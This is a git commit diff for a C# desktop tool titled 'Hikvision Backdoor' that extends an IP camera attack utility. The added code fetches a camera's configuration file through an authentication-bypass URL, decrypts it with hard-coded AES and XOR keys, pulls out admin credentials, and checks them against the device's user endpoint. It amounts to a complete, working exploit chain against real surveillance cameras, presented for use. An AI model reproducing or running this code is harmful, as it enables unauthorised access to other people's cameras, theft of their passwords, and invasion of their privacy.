fbfc08695a9b61fe9e95b970edcb4e73be2a4726
nymda <puffleboy101@hotmail.co.uk>
2020-05-10 22:16:24 +0100

    improved hik decrypting

--- KDownloader-Recoded/hikBackdoor.Designer.cs
+++ KDownloader-Recoded/hikBackdoor.Designer.cs
@@ -37,11 +37,20 @@
             this.confBtn = new System.Windows.Forms.Button();
             this.decConfBtn = new System.Windows.Forms.Button();
             this.output = new System.Windows.Forms.ListBox();
+            this.gbSetIP = new System.Windows.Forms.GroupBox();
+            this.gbGenFunc = new System.Windows.Forms.GroupBox();
+            this.gbConfFiles = new System.Windows.Forms.GroupBox();
+            this.cbSaveOutput = new System.Windows.Forms.CheckBox();
+            this.cbPurgeNonprint = new System.Windows.Forms.CheckBox();
+            this.label1 = new System.Windows.Forms.Label();
+            this.gbSetIP.SuspendLayout();
+            this.gbGenFunc.SuspendLayout();
+            this.gbConfFiles.SuspendLayout();
             this.SuspendLayout();
             // 
             // ipTextbox
             // 
-            this.ipTextbox.Location = new System.Drawing.Point(76, 12);
+            this.ipTextbox.Location = new System.Drawing.Point(76, 19);
             this.ipTextbox.Name = "ipTextbox";
             this.ipTextbox.Size = new System.Drawing.Size(172, 20);
             this.ipTextbox.TabIndex = 0;
@@ -49,7 +58,7 @@
             // ipAdrLbl
             // 
             this.ipAdrLbl.AutoSize = true;
-            this.ipAdrLbl.Location = new System.Drawing.Point(9, 15);
+            this.ipAdrLbl.Location = new System.Drawing.Point(9, 22);
             this.ipAdrLbl.Name = "ipAdrLbl";
             this.ipAdrLbl.Size = new System.Drawing.Size(61, 13);
             this.ipAdrLbl.TabIndex = 1;
@@ -57,7 +66,7 @@
             // 
             // testVulnBtn
             // 
-            this.testVulnBtn.Location = new System.Drawing.Point(12, 38);
+            this.testVulnBtn.Location = new System.Drawing.Point(12, 45);
             this.testVulnBtn.Name = "testVulnBtn";
             this.testVulnBtn.Size = new System.Drawing.Size(236, 23);
             this.testVulnBtn.TabIndex = 2;
@@ -68,7 +77,7 @@
             // snapBtn
             // 
             this.snapBtn.Enabled = false;
-            this.snapBtn.Location = new System.Drawing.Point(12, 67);
+            this.snapBtn.Location = new System.Drawing.Point(12, 19);
             this.snapBtn.Name = "snapBtn";
             this.snapBtn.Size = new System.Drawing.Size(115, 23);
             this.snapBtn.TabIndex = 4;
@@ -79,7 +88,7 @@
             // accountsBtn
             // 
             this.accountsBtn.Enabled = false;
-            this.accountsBtn.Location = new System.Drawing.Point(133, 67);
+            this.accountsBtn.Location = new System.Drawing.Point(133, 19);
             this.accountsBtn.Name = "accountsBtn";
             this.accountsBtn.Size = new System.Drawing.Size(115, 23);
             this.accountsBtn.TabIndex = 5;
@@ -90,7 +99,7 @@
             // confBtn
             // 
             this.confBtn.Enabled = false;
-            this.confBtn.Location = new System.Drawing.Point(12, 96);
+            this.confBtn.Location = new System.Drawing.Point(6, 19);
             this.confBtn.Name = "confBtn";
             this.confBtn.Size = new System.Drawing.Size(115, 42);
             this.confBtn.TabIndex = 6;
@@ -100,44 +109,117 @@
             // 
             // decConfBtn
             // 
-            this.decConfBtn.Enabled = false;
-            this.decConfBtn.Location = new System.Drawing.Point(133, 96);
+            this.decConfBtn.Location = new System.Drawing.Point(6, 67);
             this.decConfBtn.Name = "decConfBtn";
             this.decConfBtn.Size = new System.Drawing.Size(115, 42);
             this.decConfBtn.TabIndex = 7;
             this.decConfBtn.Text = "Decrypt configuration";
             this.decConfBtn.UseVisualStyleBackColor = true;
+            this.decConfBtn.Click += new System.EventHandler(this.decConfBtn_Click);
             // 
             // output
             // 
             this.output.DrawMode = System.Windows.Forms.DrawMode.OwnerDrawFixed;
             this.output.FormattingEnabled = true;
-            this.output.Location = new System.Drawing.Point(12, 144);
+            this.output.IntegralHeight = false;
+            this.output.Location = new System.Drawing.Point(276, 22);
             this.output.Name = "output";
             this.output.Size = new System.Drawing.Size(236, 251);
             this.output.TabIndex = 8;
             this.output.DrawItem += new System.Windows.Forms.DrawItemEventHandler(this.oDraw);
             // 
+            // gbSetIP
+            // 
+            this.gbSetIP.Controls.Add(this.ipTextbox);
+            this.gbSetIP.Controls.Add(this.ipAdrLbl);
+            this.gbSetIP.Controls.Add(this.testVulnBtn);
+            this.gbSetIP.Location = new System.Drawing.Point(12, 12);
+            this.gbSetIP.Name = "gbSetIP";
+            this.gbSetIP.Size = new System.Drawing.Size(258, 77);
+            this.gbSetIP.TabIndex = 9;
+            this.gbSetIP.TabStop = false;
+            this.gbSetIP.Text = "Set IP";
+            // 
+            // gbGenFunc
+            // 
+            this.gbGenFunc.Controls.Add(this.accountsBtn);
+            this.gbGenFunc.Controls.Add(this.snapBtn);
+            this.gbGenFunc.Location = new System.Drawing.Point(12, 95);
+            this.gbGenFunc.Name = "gbGenFunc";
+            this.gbGenFunc.Size = new System.Drawing.Size(258, 54);
+            this.gbGenFunc.TabIndex = 10;
+            this.gbGenFunc.TabStop = false;
+            this.gbGenFunc.Text = "General";
+            // 
+            // gbConfFiles
+            // 
+            this.gbConfFiles.Controls.Add(this.label1);
+            this.gbConfFiles.Controls.Add(this.cbPurgeNonprint);
+            this.gbConfFiles.Controls.Add(this.cbSaveOutput);
+            this.gbConfFiles.Controls.Add(this.confBtn);
+            this.gbConfFiles.Controls.Add(this.decConfBtn);
+            this.gbConfFiles.Location = new System.Drawing.Point(12, 155);
+            this.gbConfFiles.Name = "gbConfFiles";
+            this.gbConfFiles.Size = new System.Drawing.Size(258, 118);
+            this.gbConfFiles.TabIndex = 11;
+            this.gbConfFiles.TabStop = false;
+            this.gbConfFiles.Text = "Config files";
+            // 
+            // cbSaveOutput
+            // 
+            this.cbSaveOutput.AutoSize = true;
+            this.cbSaveOutput.Checked = true;
+            this.cbSaveOutput.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.cbSaveOutput.Location = new System.Drawing.Point(127, 69);
+            this.cbSaveOutput.Name = "cbSaveOutput";
+            this.cbSaveOutput.Size = new System.Drawing.Size(84, 17);
+            this.cbSaveOutput.TabIndex = 8;
+            this.cbSaveOutput.Text = "Save output";
+            this.cbSaveOutput.UseVisualStyleBackColor = true;
+            this.cbSaveOutput.CheckedChanged += new System.EventHandler(this.cbSaveOutput_CheckedChanged);
+            // 
+            // cbPurgeNonprint
+            // 
+            this.cbPurgeNonprint.AutoSize = true;
+            this.cbPurgeNonprint.Checked = true;
+            this.cbPurgeNonprint.CheckState = System.Windows.Forms.CheckState.Checked;
+            this.cbPurgeNonprint.Location = new System.Drawing.Point(127, 92);
+            this.cbPurgeNonprint.Name = "cbPurgeNonprint";
+            this.cbPurgeNonprint.Size = new System.Drawing.Size(106, 17);
+            this.cbPurgeNonprint.TabIndex = 9;
+            this.cbPurgeNonprint.Text = "Save strings only";
+            this.cbPurgeNonprint.UseVisualStyleBackColor = true;
+            // 
+            // label1
+            // 
+            this.label1.AutoSize = true;
+            this.label1.Font = new System.Drawing.Font("Microsoft Sans Serif", 6.75F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
+            this.label1.Location = new System.Drawing.Point(127, 19);
+            this.label1.Name = "label1";
+            this.label1.Size = new System.Drawing.Size(116, 36);
+            this.label1.TabIndex = 3;
+            this.label1.Text = "NOTE: Not all vulnerable\r\ncameras can be decrypted.\r\nSome have different keys!";
+            // 
             // hikBackdoor
             // 
             this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
             this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
-            this.ClientSize = new System.Drawing.Size(260, 408);
+            this.ClientSize = new System.Drawing.Size(530, 283);
+            this.Controls.Add(this.gbConfFiles);
+            this.Controls.Add(this.gbGenFunc);
+            this.Controls.Add(this.gbSetIP);
             this.Controls.Add(this.output);
-            this.Controls.Add(this.decConfBtn);
-            this.Controls.Add(this.confBtn);
-            this.Controls.Add(this.accountsBtn);
-            this.Controls.Add(this.snapBtn);
-            this.Controls.Add(this.testVulnBtn);
-            this.Controls.Add(this.ipAdrLbl);
-            this.Controls.Add(this.ipTextbox);
             this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
             this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
             this.Name = "hikBackdoor";
             this.Text = "Hikvision Backdoor";
             this.Load += new System.EventHandler(this.hikBackdoor_Load);
+            this.gbSetIP.ResumeLayout(false);
+            this.gbSetIP.PerformLayout();
+            this.gbGenFunc.ResumeLayout(false);
+            this.gbConfFiles.ResumeLayout(false);
+            this.gbConfFiles.PerformLayout();
             this.ResumeLayout(false);
-            this.PerformLayout();
 
         }
 
@@ -151,5 +233,11 @@
         private System.Windows.Forms.Button confBtn;
         private System.Windows.Forms.Button decConfBtn;
         private System.Windows.Forms.ListBox output;
+        private System.Windows.Forms.GroupBox gbSetIP;
+        private System.Windows.Forms.GroupBox gbGenFunc;
+        private System.Windows.Forms.GroupBox gbConfFiles;
+        private System.Windows.Forms.CheckBox cbPurgeNonprint;
+        private System.Windows.Forms.CheckBox cbSaveOutput;
+        private System.Windows.Forms.Label label1;
     }
 }
--- KDownloader-Recoded/hikBackdoor.cs
+++ KDownloader-Recoded/hikBackdoor.cs
@@ -4,9 +4,12 @@ using System.ComponentModel;
 using System.Data;
 using System.Diagnostics;
 using System.Drawing;
+using System.IO;
 using System.Linq;
 using System.Net;
+using System.Security.Cryptography;
 using System.Text;
+using System.Text.RegularExpressions;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
@@ -21,6 +24,8 @@ namespace KDownloader_Recoded
         public TimeWebClient w = new TimeWebClient();
         bool curIpIsVuln = false;
         public Random rnd = new Random();
+        public Thread dl;
+        public bool blownAsyncDL = false;
         public hikBackdoor()
         {
             InitializeComponent();
@@ -70,12 +75,17 @@ namespace KDownloader_Recoded
                 print(Color.Green, "Set IP Address (Vulnerable)");
                 snapBtn.Enabled = true;
                 accountsBtn.Enabled = true;
+                if (!blownAsyncDL)
+                {
+                    confBtn.Enabled = true;
+                }
             }
             else
             {
                 print(Color.Red, "IP is not vulnerable!");
                 snapBtn.Enabled = false;
                 accountsBtn.Enabled = false;
+                confBtn.Enabled = false;
             }
         }
 
@@ -123,27 +133,314 @@ namespace KDownloader_Recoded
 
         private void oDraw(object sender, DrawItemEventArgs e)
         {
-            colourItem item = output.Items[e.Index] as colourItem;
-            if (item != null)
+            if(e.Index != -1)
             {
-                Bitmap tmbmp = new Bitmap(1, 1);
-                Graphics g = Graphics.FromImage(tmbmp);
+                colourItem item = output.Items[e.Index] as colourItem;
+                if (item != null)
+                {
+                    Bitmap tmbmp = new Bitmap(1, 1);
+                    Graphics g = Graphics.FromImage(tmbmp);
 
-                int width = (int)g.MeasureString(item.Message, output.Font).Width;
-                e.Graphics.DrawString(item.Message, output.Font, new SolidBrush(item.ItemColor), ((output.Width / 2) - (width / 2)), e.Index * output.ItemHeight);
+                    int width = (int)g.MeasureString(item.Message, output.Font).Width;
+                    e.Graphics.DrawString(item.Message, output.Font, new SolidBrush(item.ItemColor), ((output.Width / 2) - (width / 2)), e.Index * output.ItemHeight);
 
-                g.Dispose();
-                tmbmp.Dispose();
-            }
-            else
-            {
+                    g.Dispose();
+                    tmbmp.Dispose();
+                }
+                else
+                {
 
+                }
             }
         }
 
         private void confBtn_Click(object sender, EventArgs e)
         {
+            string savepath = "";
+            using (SaveFileDialog dlg = new SaveFileDialog())
+            {
+                dlg.Title = "Save conf file";
+                dlg.Filter = "Hikvision config file | *.hcon";
 
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    savepath = dlg.FileName;
+                    try 
+                    {
+                        confBtn.Enabled = false;
+                        blownAsyncDL = true;
+                        print(Color.Black, "Starting download.");
+                        startMemDatDl(savepath);            
+                    }
+                    catch
+                    {
+                        print(Color.Red, "Error during download.");
+                    }
+                }
+            }
+        }
+
+        public void startMemDatDl(string path)
+        {
+            rndFuncs rn = new rndFuncs();
+            string rndFilePref = rn.RandomString(5);
+            dl = new Thread(() => {
+                w.DownloadProgressChanged += new DownloadProgressChangedEventHandler(client_DownloadProgressChanged);
+                w.DownloadFileCompleted += new AsyncCompletedEventHandler(client_DownloadFileCompleted);
+                w.DownloadFileAsync(new Uri(ipAddr + "/System/configurationFile?auth=YWRtaW46MTEK"), path);
+            });
+            dl.IsBackground = true;
+            dl.Start();
+        }
+
+        public void client_DownloadProgressChanged(object sender, DownloadProgressChangedEventArgs e)
+        {
+            this.BeginInvoke((MethodInvoker)delegate {
+                print(Color.Black, "Downloading data: " + e.BytesReceived / 1024 + "KB of " + e.TotalBytesToReceive / 1024 + "KB");
+            });
+        }
+        public void client_DownloadFileCompleted(object sender, AsyncCompletedEventArgs e)
+        {
+            print(Color.DarkGreen, "Downloading data: Done");
+        }
+
+        private void decConfBtn_Click(object sender, EventArgs e)
+        {
+            using (OpenFileDialog dlg = new OpenFileDialog())
+            {
+                dlg.Title = "Save conf file";
+                dlg.Filter = "Hikvision config file | *.hcon";
+
+                if (dlg.ShowDialog() == DialogResult.OK)
+                {
+                    doDecrypt(File.ReadAllBytes(dlg.FileName));
+                }
+            }
+        }
+
+        public void testFoundCreds(List<String> located)
+        {
+            if(ipAddr == "")
+            {
+                print(Color.Red, "IP not set! Cant test credentials.");
+                foreach(string s in located)
+                {
+                    string[] sp = s.Split(':');
+                    print(Color.DarkGreen, "Possible pass: " + sp[1]);
+                    print(Color.DarkGreen, "Possible user: " + sp[0]);
+                    print(Color.DarkCyan, "##########");
+                }
+            }
+            else
+            {
+                print(Color.DarkGreen, "Testing possible credentials...");
+                bool found = false;
+                foreach (string s in located)
+                {
+                    string[] sp = s.Split(':');
+                    if(testPossibleCreds(sp[0], sp[1]))
+                    {
+                        found = true;
+                        print(Color.DarkCyan, "##########");
+                        print(Color.DarkGreen, "Password: " + sp[1]);
+                        print(Color.DarkGreen, "Username: " + sp[0]);
+                        print(Color.DarkCyan, "##########");
+                    }
+                }
+                if (!found)
+                {
+                    print(Color.Red, "No valid credentials found! Dumping...");
+                    foreach (string s in located)
+                    {
+                        string[] sp = s.Split(':');
+                        print(Color.DarkGreen, "Possible pass: " + sp[1]);
+                        print(Color.DarkGreen, "Possible user: " + sp[0]);
+                        print(Color.DarkCyan, "##########");
+                    }
+                }
+            }
+        }
+
+        public bool testPossibleCreds(string user, string pass)
+        {
+            w.Credentials = new NetworkCredential(user, pass);
+            try
+            {
+                byte[] dldata = w.DownloadData(ipAddr + "/Security/users");
+                return true;
+            }
+            catch
+            {
+                return false;
+            }
+        }
+
+        //########## Coped from hikvision decrypter. Also by me. ##########//
+        public void doDecrypt(byte[] data)
+        {
+            byte[] key = { 0x73, 0x8B, 0x55, 0x44 };
+            byte[] xorOutput = new byte[data.Length];
+
+            print(Color.DarkGreen, "Decrypting...");
+
+            byte[] decryptedData;
+            try
+            {
+                byte[] cipherBytes = data;
+                using (Aes encryptor = Aes.Create())
+                {
+                    encryptor.Mode = CipherMode.ECB;
+                    encryptor.Padding = PaddingMode.Zeros;
+                    encryptor.Key = FromHex("27-99-77-f6-2f-6c-fd-2d-91-cd-75-b8-89-ce-0c-9a");
+                    using (MemoryStream ms = new MemoryStream())
+                    {
+                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
+                        {
+                            cs.Write(cipherBytes, 0, cipherBytes.Length);
+                            cs.Close();
+                        }
+                        decryptedData = ms.ToArray();
+                    }
+                }
+            }
+            catch
+            {
+                print(Color.Red, "Decrypt error!");
+                return;
+            }
+            print(Color.DarkGreen, "Xoring...");
+
+            for (int i = 0; i < decryptedData.Length; i++)
+            {
+                xorOutput[i] = (byte)(decryptedData[i] ^ key[i % key.Length]);
+            }
+
+            string output = Encoding.UTF8.GetString(xorOutput);
+
+            print(Color.DarkGreen, "Decrypted!");
+            print(Color.DarkGreen, "Searching for credentials...");
+
+            //this concludes decrypting.
+
+            //strip unprintable characters. seperate strings with 0x00.
+            byte[] printables = new byte[] { 27, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x5c, 0x27, 0x28, 0x29, 0x2a, 0x2b, 0x2c, 0x2d, 0x2e, 0x2f, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3a, 0x3b, 0x3c, 0x3d, 0x3e, 0x3f, 0x40, 0x41, 0x42, 0x43, 0x44, 0x45, 0x46, 0x47, 0x48, 0x49, 0x4a, 0x4b, 0x4c, 0x4d, 0x4e, 0x4f, 0x50, 0x51, 0x52, 0x53, 0x54, 0x55, 0x56, 0x57, 0x58, 0x59, 0x5a, 0x5b, 0x5c, 0x5c, 0x5d, 0x5e, 0x5f, 0x60, 0x61, 0x62, 0x63, 0x64, 0x65, 0x66, 0x67, 0x68, 0x69, 0x6a, 0x6b, 0x6c, 0x6d, 0x6e, 0x6f, 0x70, 0x71, 0x72, 0x73, 0x74, 0x75, 0x76, 0x77, 0x78, 0x79, 0x7a, 0x7b, 0x7c, 0x7d, 0x7e };
+            List<Byte> buffer = new List<Byte> { };
+            bool swit = true;
+            foreach (byte b in xorOutput)
+            {
+                if (printables.Contains(b))
+                {
+                    buffer.Add(b);
+                    swit = true;
+                }
+                else
+                {
+                    if (swit)
+                    {
+                        buffer.Add(0x00);
+                        swit = false;
+                    }
+                }
+            }
+
+            string dat = Encoding.UTF8.GetString(buffer.ToArray());
+            string[] rawSplit = dat.Split((char)0x00);
+
+
+            string username = "";
+            string password = "";
+
+            List<String> possibles = new List<String> { };
+
+            int count = 0;
+            foreach (string s in rawSplit)
+            {
+                count++;
+                //every hikvision has an "admin" account.
+                if(s == "admin")
+                {
+                    username = "admin";
+                    password = rawSplit[count];
+
+                    possibles.Add(username + ":" + password);
+                }
+            }
+
+            testFoundCreds(possibles);
+
+            if (possibles.Count() == 0)
+            {
+                print(Color.Orange, "Find manually.");
+                print(Color.Orange, "Couldnt find credentials.");
+            }
+
+            if(cbSaveOutput.Checked || possibles.Count() == 0)
+            {
+                using (SaveFileDialog dlg = new SaveFileDialog())
+                {
+                    dlg.Title = "Save decrypted data";
+                    dlg.Filter = "Text Files | *.txt";
+
+                    if (dlg.ShowDialog() == DialogResult.OK)
+                    {
+                        if (cbPurgeNonprint.Checked)
+                        {
+                            File.WriteAllText(dlg.FileName, string.Join("\n", rawSplit));
+                        }
+                        else
+                        {
+                            File.WriteAllText(dlg.FileName, output);
+                        }
+                    }
+                }
+            }
+        }
+
+        public static byte[] Decrypt(byte[] cipherText)
+        {
+
+            byte[] cipherBytes = cipherText;
+            using (Aes encryptor = Aes.Create())
+            {
+                encryptor.Mode = CipherMode.ECB;
+                encryptor.Padding = PaddingMode.Zeros;
+                encryptor.Key = FromHex("27-99-77-f6-2f-6c-fd-2d-91-cd-75-b8-89-ce-0c-9a");
+                using (MemoryStream ms = new MemoryStream())
+                {
+                    using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
+                    {
+                        cs.Write(cipherBytes, 0, cipherBytes.Length);
+                        cs.Close();
+                    }
+                    cipherText = ms.ToArray();
+                }
+            }
+            return cipherText;
+
+        }
+
+        public static byte[] FromHex(string hex)
+        {
+            hex = hex.Replace("-", "");
+            byte[] raw = new byte[hex.Length / 2];
+            for (int i = 0; i < raw.Length; i++)
+            {
+                raw[i] = Convert.ToByte(hex.Substring(i * 2, 2), 16);
+            }
+            return raw;
+        }
+
+        private void cbSaveOutput_CheckedChanged(object sender, EventArgs e)
+        {
+            if (!cbSaveOutput.Checked)
+            {
+                cbPurgeNonprint.Checked = false;
+                cbPurgeNonprint.Enabled = false;
+            }
+            else
+            {
+                cbPurgeNonprint.Enabled = true;
+            }
         }
     }
 }
